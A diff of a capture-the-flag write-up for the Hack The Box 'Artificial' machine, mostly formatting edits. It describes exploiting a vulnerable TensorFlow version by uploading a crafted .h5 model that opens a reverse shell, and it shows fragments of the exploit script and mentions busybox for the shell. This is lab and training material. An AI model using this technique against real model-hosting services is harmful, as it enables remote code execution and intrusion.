@@ -25,15 +25,21 @@ adding the domain to our `/etc/hosts `
 
 `sudo echo "10.10.11.74     artificial.htb" >> /etc/hosts`
 
-simple looking ui 
+simple ass looking ui  
+
 <img src="https://raw.githubusercontent.com/Baga6312/HTB-Writeups/refs/heads/main/machines/artificial/assets/Pasted image 20251017162502.png">
+
 registering a new account and logging in with it 
+
 <img src="https://raw.githubusercontent.com/Baga6312/HTB-Writeups/refs/heads/main/machines/artificial/assets/Pasted image 20251017162718.png">
+
 this will lead us to the page where it present us with this .. 
+
 <img src="https://raw.githubusercontent.com/Baga6312/HTB-Writeups/refs/heads/main/machines/artificial/assets/Pasted image 20251017162855.png">
+
 checking the `requirement.txt` and `Dockerfile` 
 
-Dockerfile 
+`Dockerfile`
 ```
 FROM python:3.8-slim
 
@@ -49,7 +55,7 @@ RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinu
 ENTRYPOINT ["/bin/bash"]
 ```
 
-requirements.txt 
+`requirements.txt`
 ```
 tensorflow-cpu==2.13.1
 ```
@@ -58,18 +64,18 @@ this version of tensorflow library might have some vurnabilitys .
 
 after searching i found this 
 
-https://github.com/advisories/GHSA-x4wf-678h-2pmq
+[https://github.com/advisories/GHSA-x4wf-678h-2pmq](https://github.com/advisories/GHSA-x4wf-678h-2pmq)
 
 looking for POC to recreate the exploit 
 
-https://mastersplinter.work/research/tensorflow-rce/
+[https://mastersplinter.work/research/tensorflow-rce/](https://mastersplinter.work/research/tensorflow-rce/)
 
 the idea is to generate a `.h5` model that contains our malicious command so we can import it and get a reverse shell 
 
 to recreate the exploit we need first to install tensorflow on our machine  (which is annoying task) 
 
 
-```python3 
+```
 import tensorflow as tf
 
 def exploit(x):
@@ -86,6 +92,7 @@ model.save("exploit.h5")
 
 I always use busybox since its found on every linux distro . 
 
+--- 
 generating our model 
 ```cmd
 python3 exploit.py 
